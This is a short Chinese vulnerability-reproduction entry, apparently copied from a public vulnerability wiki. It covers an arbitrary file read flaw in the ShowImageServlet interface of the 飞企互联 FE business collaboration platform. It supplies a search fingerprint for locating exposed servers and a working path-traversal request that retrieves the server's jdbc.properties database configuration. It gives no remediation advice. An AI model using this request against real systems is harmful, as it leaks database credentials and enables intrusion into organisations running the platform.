---
title: "飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞"
date: 2026-10-16 09:11:52
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "飞企互联-FE业务协作平台-ShowImageServlet"
tags:
  - "飞企互联-FE业务协作平台-ShowImageServlet"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

飞企互联 FE业务协作平台 ShowImageServlet 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件

## 漏洞影响

飞企互联 FE业务协作平台

## 网络测绘

```
"flyrise.stopBackspace.js"
```

## 漏洞复现

登陆页面

![image-20230828145057107](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828145057107.png)

验证POC

```
/servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties&print
```

![image-20230828145109229](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828145109229.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-FE%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-ShowImageServlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
